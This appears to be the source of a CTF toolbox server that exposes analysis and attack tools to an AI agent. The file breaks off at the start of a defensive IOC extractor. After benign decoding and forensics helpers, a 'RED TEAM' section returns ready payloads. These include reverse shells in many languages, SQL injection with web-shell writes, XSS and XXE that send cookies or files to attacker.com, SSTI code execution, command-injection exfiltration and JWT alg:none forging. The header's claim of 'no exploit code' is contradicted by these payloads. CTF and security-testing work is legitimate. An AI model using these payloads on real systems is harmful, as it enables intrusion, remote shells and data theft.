#!/usr/bin/env python3
"""CTF toolbox MCP server.

Author & Original Idea: Divjot Sabharwal
All code, architecture, and toolbox design for FlagHunt was created by
Divjot Sabharwal.
Additional ideas contributed by: Kanu Lala.

Exposes a set of *general-purpose* analysis utilities that are commonly useful
in Capture-the-Flag challenges: encoding/crypto helpers, forensics wrappers,
binary-analysis helpers, and web decoders. It deliberately ships only benign
analysis primitives and no exploit code -- the agent composes these tools.

All filesystem tools operate strictly inside WORKSPACE, which docker-compose
mounts read-only from ./challenges. Paths are validated to block traversal so
a tool call can't wander outside the challenge artifacts.

Transport: Streamable HTTP, served at /mcp (host/port come from FASTMCP_* env).
"""

from __future__ import annotations

import base64
import codecs
import hashlib
import os
import re
import subprocess
import urllib.parse
from pathlib import Path

from mcp.server.fastmcp import FastMCP

WORKSPACE = Path(os.environ.get("CTF_WORKSPACE", "/workspace")).resolve()
SCRATCH = Path(os.environ.get("CTF_SCRATCH", "/tmp/ctf"))
HTTP_FETCH_MAX_BYTES = 2_000_000
SUBPROCESS_TIMEOUT = 30

# Bind host/port explicitly. Recent FastMCP no longer reliably reads FASTMCP_HOST
# / FASTMCP_PORT into its settings, and the default (127.0.0.1) leaves the server
# unreachable from outside the container -- even through Docker's published port.
HOST = os.environ.get("FASTMCP_HOST", "0.0.0.0")
PORT = int(os.environ.get("FASTMCP_PORT", "8000"))

mcp = FastMCP("ctf-toolbox", host=HOST, port=PORT)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
def _safe_path(path: str) -> Path:
    """Resolve `path` and guarantee it stays inside WORKSPACE."""
    base = Path(path)
    candidate = (base if base.is_absolute() else WORKSPACE / base).resolve()
    if os.path.commonpath([str(candidate), str(WORKSPACE)]) != str(WORKSPACE):
        raise ValueError(f"path escapes workspace: {path}")
    if not candidate.exists():
        raise FileNotFoundError(f"no such file in workspace: {path}")
    return candidate


def _run(cmd: list[str]) -> str:
    """Run a CLI tool with a hard timeout and return its combined output."""
    try:
        proc = subprocess.run(
            cmd, capture_output=True, text=True, timeout=SUBPROCESS_TIMEOUT
        )
    except subprocess.TimeoutExpired:
        return f"[timed out after {SUBPROCESS_TIMEOUT}s running {cmd[0]}]"
    except FileNotFoundError:
        return f"[tool not installed in image: {cmd[0]}]"
    out = (proc.stdout or "").strip()
    if proc.stderr.strip():
        out += "\n[stderr]\n" + proc.stderr.strip()
    return out or "[no output]"


def _truncate(text: str, limit: int) -> str:
    lines = text.splitlines()
    if len(lines) <= limit:
        return text
    extra = len(lines) - limit
    return "\n".join(lines[:limit] + [f"... [{extra} more lines truncated]"])


# ---------------------------------------------------------------------------
# Encoding / crypto
# ---------------------------------------------------------------------------
@mcp.tool()
def base64_decode(data: str) -> str:
    """Decode a base64 or base64url string to UTF-8 text. Use for encoded flags or blobs."""
    s = data.strip()
    s += "=" * (-len(s) % 4)
    raw = (
        base64.urlsafe_b64decode(s)
        if ("-" in s or "_" in s)
        else base64.b64decode(s)
    )
    return raw.decode("utf-8", errors="replace")


@mcp.tool()
def base64_encode(text: str) -> str:
    """Encode UTF-8 text to standard base64."""
    return base64.b64encode(text.encode()).decode()


@mcp.tool()
def hex_decode(data: str) -> str:
    """Decode a hex string (spaces and 0x prefixes are ignored) to UTF-8 text."""
    cleaned = re.sub(r"0x|\s", "", data)
    return bytes.fromhex(cleaned).decode("utf-8", errors="replace")


@mcp.tool()
def rot13(text: str) -> str:
    """Apply the ROT13 substitution to text."""
    return codecs.encode(text, "rot_13")


@mcp.tool()
def caesar_bruteforce(text: str) -> str:
    """Show all 25 Caesar-cipher shifts of `text` so you can pick out the readable one."""
    lines = []
    for shift in range(1, 26):
        chars = []
        for c in text:
            if c.isalpha():
                base = 65 if c.isupper() else 97
                chars.append(chr((ord(c) - base + shift) % 26 + base))
            else:
                chars.append(c)
        lines.append(f"{shift:2d}: {''.join(chars)}")
    return "\n".join(lines)


@mcp.tool()
def xor_hex(data_hex: str, key_hex: str) -> str:
    """XOR a hex buffer against a repeating hex key. Returns the result as hex and latin-1 text."""
    data = bytes.fromhex(re.sub(r"\s", "", data_hex))
    key = bytes.fromhex(re.sub(r"\s", "", key_hex))
    if not key:
        raise ValueError("empty key")
    out = bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
    return f"hex:   {out.hex()}\nascii: {out.decode('latin-1')}"


@mcp.tool()
def url_decode(data: str) -> str:
    """Percent-decode a URL-encoded string."""
    return urllib.parse.unquote_plus(data)


@mcp.tool()
def identify_hash(value: str) -> str:
    """Guess the hash algorithm of a digest by its length and character set."""
    v = value.strip()
    is_hex = bool(re.fullmatch(r"[0-9a-fA-F]+", v))
    by_len = {
        32: "MD5 / NTLM",
        40: "SHA-1",
        56: "SHA-224",
        64: "SHA-256",
        96: "SHA-384",
        128: "SHA-512",
    }
    guesses: list[str] = []
    if is_hex and len(v) in by_len:
        guesses.append(by_len[len(v)])
    for prefix, name in (("$2", "bcrypt"), ("$argon2", "argon2"), ("$6$", "sha512crypt")):
        if v.startswith(prefix):
            guesses.append(name)
    return ", ".join(guesses) if guesses else f"unknown (len={len(v)}, hex={is_hex})"


@mcp.tool()
def hash_text(text: str, algorithm: str = "sha256") -> str:
    """Compute a hash digest of text. algorithm: md5, sha1, sha256, sha512, etc."""
    algo = algorithm.lower()
    if algo not in hashlib.algorithms_available:
        raise ValueError(f"unsupported algorithm: {algorithm}")
    return hashlib.new(algo, text.encode()).hexdigest()


# ---------------------------------------------------------------------------
# Forensics (workspace files)
# ---------------------------------------------------------------------------
@mcp.tool()
def list_workspace() -> str:
    """List the files available in the challenge workspace, with sizes."""
    files = [
        f"{p.relative_to(WORKSPACE)} ({p.stat().st_size} bytes)"
        for p in sorted(WORKSPACE.rglob("*"))
        if p.is_file()
    ]
    return "\n".join(files) if files else "[workspace is empty]"


@mcp.tool()
def file_type(path: str) -> str:
    """Identify a workspace file's type from its magic bytes (the `file` command)."""
    return _run(["file", str(_safe_path(path))])


@mcp.tool()
def strings_extract(path: str, min_length: int = 4, limit: int = 400) -> str:
    """Extract printable strings from a workspace file (like the `strings` command)."""
    out = _run(["strings", "-n", str(min_length), str(_safe_path(path))])
    return _truncate(out, limit)


@mcp.tool()
def binwalk_scan(path: str) -> str:
    """Scan a workspace file for embedded files and signatures using binwalk."""
    return _run(["binwalk", str(_safe_path(path))])


@mcp.tool()
def exif_metadata(path: str) -> str:
    """Read embedded metadata from a workspace file using exiftool."""
    return _run(["exiftool", str(_safe_path(path))])


@mcp.tool()
def steghide_extract(path: str, passphrase: str = "") -> str:
    """Try to extract data hidden with steghide from a workspace image/audio file.

    An empty passphrase attempts extraction with no password.
    """
    target = _safe_path(path)
    SCRATCH.mkdir(parents=True, exist_ok=True)
    out_file = SCRATCH / f"{target.stem}.extracted"
    res = _run(
        ["steghide", "extract", "-sf", str(target),
         "-xf", str(out_file), "-p", passphrase, "-f"]
    )
    if out_file.exists():
        data = out_file.read_bytes()
        head = data[:4096]
        try:
            return f"extracted {len(data)} bytes:\n{head.decode('utf-8')}"
        except UnicodeDecodeError:
            return f"extracted {len(data)} bytes (binary). hex preview:\n{head[:256].hex()}"
    return res


# ---------------------------------------------------------------------------
# Steganography
# ---------------------------------------------------------------------------
@mcp.tool()
def zsteg_scan(path: str, limit: int = 200) -> str:
    """Scan a lossless image (PNG/BMP) for LSB-based steganography with zsteg.

    Runs every zsteg detector across the common bit/channel orderings and
    reports any embedded text, files, or signatures. This is the best automated
    FIRST PASS for image LSB stego -- use it when you suspect data is hidden in
    an image but don't yet know the scheme. Complements steghide_extract, which
    targets JPEG/audio rather than raw pixel LSBs.
    """
    return _truncate(_run(["zsteg", "-a", str(_safe_path(path))]), limit)


@mcp.tool()
def wav_lsb_extract(path: str, bits: int = 1, limit: int = 4096) -> str:
    """Extract least-significant-bit data hidden in a WAV file's PCM samples.

    Reads the low `bits` (1-8) of every audio sample, packs them MSB-first into
    bytes, and returns a text/hex preview. Use this for AUDIO stego where a
    message is encoded in sample LSBs -- a different use case from zsteg (images)
    and steghide. `bits=1` is the usual convention; raise it if the data looks
    spread across more low bits. `limit` caps the returned bytes.
    """
    import wave

    if not 1 <= bits <= 8:
        raise ValueError("bits must be between 1 and 8")

    target = _safe_path(path)
    with wave.open(str(target), "rb") as w:
        sampwidth = w.getsampwidth()
        raw = w.readframes(w.getnframes())
    if sampwidth < 1:
        raise ValueError("unsupported WAV sample width")

    # The least-significant byte of each (little-endian) sample carries the LSBs.
    out = bytearray()
    acc = count = 0
    for i in range(0, len(raw), sampwidth):
        low = raw[i]
        for b in range(bits):
            acc = (acc << 1) | ((low >> b) & 1)
            count += 1
            if count == 8:
                out.append(acc)
                acc = count = 0
                if len(out) >= limit:
                    break
        if len(out) >= limit:
            break

    head = bytes(out)
    try:
        return f"{len(head)} bytes extracted (bits={bits}):\n{head.decode('utf-8')}"
    except UnicodeDecodeError:
        return (
            f"{len(head)} bytes extracted (bits={bits}); not clean UTF-8.\n"
            f"latin-1:\n{head.decode('latin-1')[:1000]}\n\nhex:\n{head[:256].hex()}"
        )


# ---------------------------------------------------------------------------
# Reversing / pwn helpers
# ---------------------------------------------------------------------------
@mcp.tool()
def disassemble(path: str, limit: int = 300) -> str:
    """Disassemble a workspace binary with objdump (intel syntax)."""
    out = _run(["objdump", "-d", "-M", "intel", str(_safe_path(path))])
    return _truncate(out, limit)


@mcp.tool()
def checksec(path: str) -> str:
    """Report binary mitigations (arch, RELRO, stack canary, NX, PIE) for a workspace ELF."""
    target = _safe_path(path)
    try:
        import logging

        from pwn import ELF

        logging.getLogger("pwnlib").setLevel(logging.ERROR)
        elf = ELF(str(target), checksec=False)
        return (
            f"arch:   {elf.arch} ({elf.bits}-bit)\n"
            f"RELRO:  {elf.relro or 'No RELRO'}\n"
            f"Canary: {elf.canary}\n"
            f"NX:     {elf.nx}\n"
            f"PIE:    {elf.pie}"
        )
    except Exception as e:  # noqa: BLE001
        return f"[checksec failed: {e}]"


@mcp.tool()
def cyclic_pattern(length: int = 200) -> str:
    """Generate a De Bruijn cyclic pattern of `length` bytes (pwntools) for locating overflow offsets."""
    from pwn import cyclic

    return cyclic(length).decode("latin-1")


@mcp.tool()
def cyclic_find(value: str) -> str:
    """Find the offset of a value within the cyclic pattern.

    `value` may be a little-endian hex word (e.g. 0x6161616c) or a 4-char ASCII
    fragment recovered from a crashed register.
    """
    from pwn import cyclic_find as _find

    v = value.strip()
    try:
        if v.lower().startswith("0x"):
            needle = int(v, 16).to_bytes(4, "little")
        else:
            needle = v.encode("latin-1")
        return f"offset: {_find(needle)}"
    except Exception as e:  # noqa: BLE001
        return f"[not found in default pattern: {e}]"


# ---------------------------------------------------------------------------
# Web
# ---------------------------------------------------------------------------
@mcp.tool()
def jwt_decode(token: str) -> str:
    """Decode a JWT's header and payload WITHOUT verifying the signature (inspection only)."""
    parts = token.strip().split(".")
    if len(parts) < 2:
        raise ValueError("not a JWT (expected header.payload.signature)")

    def seg(s: str) -> str:
        s += "=" * (-len(s) % 4)
        return base64.urlsafe_b64decode(s).decode("utf-8", errors="replace")

    return f"header:\n{seg(parts[0])}\n\npayload:\n{seg(parts[1])}"


@mcp.tool()
def http_fetch(url: str) -> str:
    """Fetch a URL (GET) to inspect a web challenge. Returns status, headers, and a
    truncated body. Use ONLY against targets you are authorised to test.
    """
    import requests

    if not url.lower().startswith(("http://", "https://")):
        raise ValueError("url must start with http:// or https://")
    resp = requests.get(url, timeout=15, stream=True, allow_redirects=True)
    body = resp.raw.read(HTTP_FETCH_MAX_BYTES, decode_content=True)
    headers = "\n".join(f"{k}: {v}" for k, v in resp.headers.items())
    return f"HTTP {resp.status_code}\n{headers}\n\n{body.decode('utf-8', errors='replace')}"


# ---------------------------------------------------------------------------
# Networking (pcap)
# ---------------------------------------------------------------------------
@mcp.tool()
def pcap_overview(path: str, limit: int = 120) -> str:
    """Triage a packet capture (pcap/pcapng): protocol hierarchy plus the busiest
    TCP conversations, via tshark.

    Run this FIRST on an unknown capture to see which protocols are present and
    which conversations carry the most data, so you know what to dig into. Each
    TCP conversation is numbered -- feed an index to pcap_follow_stream to read it.
    """
    target = str(_safe_path(path))
    phs = _run(["tshark", "-r", target, "-q", "-z", "io,phs"])
    conv = _run(["tshark", "-r", target, "-q", "-z", "conv,tcp"])
    return f"=== protocol hierarchy ===\n{phs}\n\n=== TCP conversations ===\n{_truncate(conv, limit)}"


@mcp.tool()
def pcap_follow_stream(path: str, stream_index: int = 0, protocol: str = "tcp", limit: int = 400) -> str:
    """Reassemble one TCP or UDP stream from a capture, like Wireshark's
    'Follow Stream', via tshark.

    Use this to recover what was actually transferred in a single conversation --
    leaked credentials, an uploaded/downloaded file, chat messages, or a flag.
    `protocol` is 'tcp' or 'udp'; pick `stream_index` from pcap_overview. This is
    the extraction counterpart to pcap_overview's triage.
    """
    proto = protocol.lower()
    if proto not in ("tcp", "udp"):
        raise ValueError("protocol must be 'tcp' or 'udp'")
    out = _run([
        "tshark", "-r", str(_safe_path(path)), "-q",
        "-z", f"follow,{proto},ascii,{int(stream_index)}",
    ])
    return _truncate(out, limit)


# ---------------------------------------------------------------------------
# RED TEAM — Attacking Toolbox
# ---------------------------------------------------------------------------

@mcp.tool()
def red_reverse_shell(lhost: str, lport: int = 4444, shell_type: str = "bash") -> str:
    """Generate a reverse-shell one-liner for common languages / runtimes.

    shell_type options: bash, python3, python, php, perl, ruby, nc, powershell, java, go
    Use ONLY against targets you are authorised to test (e.g. your own CTF box).
    """
    shells: dict[str, str] = {
        "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        "bash_196": f"0<&196;exec 196<>/dev/tcp/{lhost}/{lport}; sh <&196 >&196 2>&196",
        "python3": (
            f"python3 -c 'import socket,subprocess,os;"
            f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            f"s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);"
            f"os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            f"subprocess.call([\"/bin/sh\",\"-i\"])'"
        ),
        "python": (
            f"python -c 'import socket,subprocess,os;"
            f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            f"s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);"
            f"os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            f"subprocess.call([\"/bin/sh\",\"-i\"])'"
        ),
        "php": (
            f"php -r '$sock=fsockopen(\"{lhost}\",{lport});"
            f"exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        ),
        "perl": (
            f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};"
            f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
            f"connect(S,sockaddr_in($p,inet_aton($i)));STDIN->fdopen(S,\"r\");"
            f"$~->fdopen(S,\"w\");system $_ while<>;'"
        ),
        "ruby": (
            f"ruby -rsocket -e 'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;"
            f"exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
        ),
        "nc": f"nc -e /bin/sh {lhost} {lport}",
        "nc_mkfifo": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
        "powershell": (
            f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command "
            f"\"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
            f"$stream = $client.GetStream();"
            f"[byte[]]$bytes = 0..65535|%{{0}};"
            f"while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{"
            f";$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
            f"$sendback = (iex $data 2>&1 | Out-String );"
            f"$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';"
            f"$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
            f"$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};"
            f"$client.Close()\""
        ),
        "java": (
            f"r = Runtime.getRuntime();"
            f"p = r.exec(new String[]{{\"cmd\",\"/c\",\"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\"}});"
            f"p.waitFor();"
        ),
        "go": (
            f"echo 'package main;import\"os/exec\";import\"net\";func main(){{"
            f"c,_:=net.Dial(\"tcp\",\"{lhost}:{lport}\");"
            f"cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}' > /tmp/rs.go"
            f" && go run /tmp/rs.go"
        ),
    }
    key = shell_type.lower()
    if key not in shells:
        available = ", ".join(sorted(shells))
        raise ValueError(f"unknown shell_type '{shell_type}'. Available: {available}")
    return shells[key]


@mcp.tool()
def red_sql_payloads(db_type: str = "mysql") -> str:
    """Return a curated list of SQL injection test payloads for the given database.

    db_type: mysql, mssql, postgres, sqlite, oracle, generic
    Covers detection, auth bypass, union-based, blind boolean, and time-based payloads.
    """
    generic = [
        "-- Detection --",
        "' OR '1'='1",
        "' OR '1'='1'--",
        "' OR 1=1--",
        "admin'--",
        "' OR 'x'='x",
        "' OR 1=1#",
        "",
        "-- UNION (adjust column count) --",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT 1,2,3--",
        "",
        "-- Stacked queries (if supported) --",
        "'; SELECT SLEEP(5)--",
        "'; WAITFOR DELAY '0:0:5'--",
        "",
        "-- Auth bypass --",
        "' OR '1'='1' LIMIT 1--",
        "') OR ('1'='1",
        "' OR 1=1 LIMIT 1;--",
    ]
    extras: dict[str, list[str]] = {
        "mysql": [
            "",
            "-- MySQL-specific --",
            "' AND SLEEP(5)--",
            "' AND 1=BENCHMARK(5000000,MD5(1))--",
            "' UNION SELECT table_name,NULL FROM information_schema.tables--",
            "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--",
            "' UNION SELECT user(),version()--",
            "' UNION SELECT load_file('/etc/passwd'),NULL--",
            "' INTO OUTFILE '/var/www/html/shell.php'--",
        ],
        "mssql": [
            "",
            "-- MSSQL-specific --",
            "'; WAITFOR DELAY '0:0:5'--",
            "'; EXEC xp_cmdshell('whoami')--",
            "' UNION SELECT table_name,NULL FROM information_schema.tables--",
            "' UNION SELECT name,NULL FROM sysdatabases--",
            "' UNION SELECT user_name(),@@version--",
        ],
        "postgres": [
            "",
            "-- PostgreSQL-specific --",
            "'; SELECT pg_sleep(5)--",
            "' UNION SELECT table_name,NULL FROM information_schema.tables--",
            "' UNION SELECT current_user,version()--",
            "'; COPY (SELECT '') TO PROGRAM 'id'--",
        ],
        "sqlite": [
            "",
            "-- SQLite-specific --",
            "' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'--",
            "' UNION SELECT sql,NULL FROM sqlite_master WHERE type='table'--",
        ],
        "oracle": [
            "",
            "-- Oracle-specific --",
            "' UNION SELECT table_name,NULL FROM all_tables--",
            "' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--",
            "' UNION SELECT user,NULL FROM dual--",
            "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
        ],
    }
    lines = generic + extras.get(db_type.lower(), ["", f"[no extras for db_type={db_type}; use mysql/mssql/postgres/sqlite/oracle/generic]"])
    return "\n".join(lines)


@mcp.tool()
def red_xss_payloads(context: str = "html") -> str:
    """Return XSS payloads for the given injection context.

    context: html (default), attr, js, url, css
    """
    payloads: dict[str, list[str]] = {
        "html": [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "<details open ontoggle=alert(1)>",
            "<video><source onerror=alert(1)>",
            "<!--<script>-->  <script>alert(1)</script>",
            "<script>fetch('https://attacker.com?c='+document.cookie)</script>",
            "<img src=1 onerror=\"eval(atob('YWxlcnQoMSk='))\">",
        ],
        "attr": [
            "\" onmouseover=\"alert(1)\" x=\"",
            "' onmouseover='alert(1)' x='",
            "\" autofocus onfocus=\"alert(1)\"",
            "javascript:alert(1)",
            "\" onerror=\"alert(1)\" src=\"x",
        ],
        "js": [
            "';alert(1)//",
            "\";alert(1)//",
            "</script><script>alert(1)</script>",
            "\\';alert(1)//",
            "1;alert(1)",
            "'-alert(1)-'",
        ],
        "url": [
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
            "vbscript:alert(1)",
            "%3Cscript%3Ealert(1)%3C/script%3E",
        ],
        "css": [
            "expression(alert(1))",
            "background-image:url(javascript:alert(1))",
            "-moz-binding:url(data:text/xml;charset=utf-8,<bindings><binding id='x'><implementation><constructor>alert(1)</constructor></implementation></binding></bindings>#x)",
        ],
    }
    key = context.lower()
    if key not in payloads:
        raise ValueError(f"unknown context '{context}'. Use: {', '.join(payloads)}")
    return "\n".join(payloads[key])


@mcp.tool()
def red_ssti_payloads() -> str:
    """Return SSTI detection and exploitation payloads for Jinja2, Twig, Freemarker, Pebble, Smarty, Mako."""
    return """\
=== Detection (inject these, look for numeric output) ===
{{7*7}}           -> 49  (Jinja2 / Twig)
${7*7}            -> 49  (Freemarker / Mako)
#{7*7}            -> 49  (Pebble / Velocity)
<%= 7*7 %>        -> 49  (ERB / EJS)
{{7*'7'}}         -> 7777777  (Jinja2 only -- distinguishes from Twig which gives 49)

=== Jinja2 (Python) ===
{{config}}
{{config.items()}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{''.__class__.__mro__[1].__subclasses__()[<N>]('id',shell=True,stdout=-1).communicate()}}
{{'id'|e}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{% endfor %}

=== Twig (PHP) ===
{{7*7}}
{{dump(app)}}
{{app.request.server.all|join(',')}}
{{'/etc/passwd'|file_excerpt(1,30)}}

=== Freemarker (Java) ===
${7*7}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.Execute"?new()("id")}

=== Smarty (PHP) ===
{php}echo `id`;{/php}
{$smarty.version}

=== Mako (Python) ===
${7*7}
<%import os;x=os.popen('id').read()%>${x}
"""


@mcp.tool()
def red_lfi_paths(os_type: str = "linux") -> str:
    """Return common LFI / path-traversal target paths and bypass sequences.

    os_type: linux (default), windows
    """
    traversal = [
        "-- Traversal sequences (URL-encode as needed) --",
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "....\\\\....\\\\....\\\\etc\\\\passwd",
        "/etc/passwd%00",       # null-byte truncation (PHP < 5.3)
    ]
    linux_files = [
        "",
        "-- High-value Linux files --",
        "/etc/passwd",
        "/etc/shadow",
        "/etc/hosts",
        "/etc/hostname",
        "/etc/crontab",
        "/proc/self/environ",
        "/proc/self/cmdline",
        "/proc/self/fd/0",
        "/var/log/apache2/access.log",
        "/var/log/apache2/error.log",
        "/var/log/nginx/access.log",
        "/var/log/auth.log",
        "/root/.ssh/id_rsa",
        "/home/<user>/.ssh/id_rsa",
        "/home/<user>/.bash_history",
        "/var/www/html/config.php",
        "/var/www/html/.env",
    ]
    windows_files = [
        "",
        "-- High-value Windows files --",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "C:\\Windows\\win.ini",
        "C:\\Windows\\System32\\config\\SAM",
        "C:\\Windows\\repair\\SAM",
        "C:\\Users\\Administrator\\NTUser.dat",
        "C:\\inetpub\\wwwroot\\web.config",
        "C:\\xampp\\apache\\logs\\access.log",
        "C:\\xampp\\htdocs\\config.php",
    ]
    parts = traversal + (linux_files if os_type.lower() == "linux" else windows_files)
    return "\n".join(parts)


@mcp.tool()
def red_jwt_forge(token: str, new_claims: str = "", algorithm: str = "none") -> str:
    """Forge a JWT for CTF web challenges.

    algorithm='none': strips the signature (alg:none attack -- accepted by some libraries).
    new_claims: JSON string of claims to inject into the payload, e.g. '{"admin":true,"role":"superuser"}'.
    """
    import json

    parts = token.strip().split(".")
    if len(parts) < 2:
        raise ValueError("Not a valid JWT (expected header.payload.signature)")

    def _b64_decode(s: str) -> dict:
        s += "=" * (-len(s) % 4)
        return json.loads(base64.urlsafe_b64decode(s))

    def _b64_encode(obj: dict) -> str:
        return (
            base64.urlsafe_b64encode(
                json.dumps(obj, separators=(",", ":")).encode()
            )
            .rstrip(b"=")
            .decode()
        )

    header = _b64_decode(parts[0])
    payload = _b64_decode(parts[1])

    original = f"header: {json.dumps(header, indent=2)}\npayload: {json.dumps(payload, indent=2)}"

    header["alg"] = algorithm

    if new_claims:
        overrides = json.loads(new_claims)
        payload.update(overrides)

    enc_header = _b64_encode(header)
    enc_payload = _b64_encode(payload)

    if algorithm == "none":
        forged = f"{enc_header}.{enc_payload}."
        note = "Signature stripped. Try sending both with and without the trailing dot."
    else:
        forged = f"{enc_header}.{enc_payload}.[SIGNATURE-NOT-COMPUTED]"
        note = f"Algorithm changed to {algorithm}. You must re-sign with the correct key."

    return f"=== Original ===\n{original}\n\n=== Forged token ===\n{forged}\n\nNote: {note}"


@mcp.tool()
def red_xxe_payloads(target_file: str = "/etc/passwd") -> str:
    """Generate XXE payloads to read a file from a vulnerable XML parser."""
    return f"""\
=== Classic in-band XXE ===
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{target_file}">]>
<root>&xxe;</root>

=== XXE via parameter entity (works in some parsers) ===
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "file://{target_file}">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<data>&send;</data>

-- evil.dtd on your server: --
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?x=%file;'>">
%all;

=== XXE via XInclude (when you control an attribute value only) ===
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file://{target_file}"/>
</foo>

=== SSRF / port scan via XXE ===
<!DOCTYPE foo [<!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root>&ssrf;</root>

=== Blind OOB (DNS exfil) ===
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://BURP_COLLABORATOR/?file="> %xxe; ]>
"""


@mcp.tool()
def red_command_injection_payloads() -> str:
    """Return command injection test payloads covering Linux, Windows, and bypass techniques."""
    return """\
=== Basic detection ===
; id
| id
|| id
& id
&& id
`id`
$(id)
; ping -c 1 attacker.com
| ping -c 1 attacker.com

=== Windows ===
& whoami
| whoami
|| whoami
&& whoami
; dir
%0a whoami

=== Out-of-band (DNS exfil) ===
; nslookup `id`.attacker.com
| curl http://attacker.com/`id`
$(wget -q http://attacker.com/$(id) -O -)

=== Filter bypasses ===
c''at /etc/passwd        # single quotes break keyword filters
ca$@t /etc/passwd        # bash ignores $@
c${IFS}a${IFS}t${IFS}/etc/passwd   # IFS as space
{cat,/etc/passwd}        # brace expansion
/bin/c?t /etc/passwd     # glob
base64 -d <<< 'Y2F0IC9ldGMvcGFzc3dk' | bash   # encoded cmd
/???/bin/base64 /etc/shadow
"""


@mcp.tool()
def red_hash_crack(hash_value: str, wordlist_path: str = "") -> str:
    """Attempt to crack a hash using john-the-ripper against a workspace wordlist.

    hash_value: the hash string to crack (john auto-detects the format).
    wordlist_path: path to a wordlist file inside the workspace (optional).
    If no wordlist is given, john runs with its built-in defaults.
    """
    SCRATCH.mkdir(parents=True, exist_ok=True)
    hash_file = SCRATCH / "crack_target.hash"
    hash_file.write_text(hash_value.strip() + "\n")

    cmd = ["john", str(hash_file)]
    if wordlist_path:
        wl = _safe_path(wordlist_path)
        cmd += [f"--wordlist={wl}"]

    result = _run(cmd)

    # Try to show the cracked result
    show = _run(["john", "--show", str(hash_file)])
    return f"=== john output ===\n{result}\n\n=== cracked (john --show) ===\n{show}"


@mcp.tool()
def red_directory_wordlist() -> str:
    """Return a concise common web directory/file wordlist for fuzzing hidden paths."""
    return "\n".join([
        # Admin / management
        "admin", "administrator", "admin.php", "admin.html", "login", "login.php",
        "dashboard", "panel", "controlpanel", "manage", "manager", "wp-admin",
        "phpmyadmin", "adminer", "myadmin",
        # Config / source
        ".env", ".env.local", ".env.production", "config.php", "config.yml",
        "config.json", "settings.php", "configuration.php", "database.php",
        "web.config", "app.config",
        # Backup files
        "backup", "backup.zip", "backup.tar.gz", "db.sql", "dump.sql",
        "backup.sql", "site.zip", "www.zip",
        # Common dirs
        "api", "api/v1", "api/v2", "uploads", "files", "static", "assets",
        "images", "img", "css", "js", "include", "includes", "lib", "libs",
        "src", "vendor", "node_modules",
        # Info disclosure
        "robots.txt", "sitemap.xml", ".htaccess", ".htpasswd", ".git/HEAD",
        ".git/config", ".svn/entries", "phpinfo.php", "info.php", "test.php",
        "server-status", "server-info", "readme.md", "README.md", "CHANGELOG.md",
        # Auth / sessions
        "register", "signup", "logout", "reset", "forgot", "password", "auth",
        "oauth", "sso", "token",
        # Flags (CTF-specific)
        "flag.txt", "flag", "secret", "secret.txt", "key.txt", "password.txt",
        "note.txt", "notes.txt",
    ])


# ---------------------------------------------------------------------------
# BLUE TEAM — Defending Toolbox
# ---------------------------------------------------------------------------

@mcp.tool()
def blue_ioc_extract(text: str) -> str:
    """Extract Indicators of Compromise from free text.

    Finds: IPv4 addresses, domains, URLs, MD5/SHA-1/SHA-256/SHA-512 hashes, CVE IDs,
    email addresses, Windows registry keys, and file hashes.
    Useful for triaging incident reports, log dumps, or malware analysis output.
    """
    results: dict[str, list[str]] = {}

    patterns = {
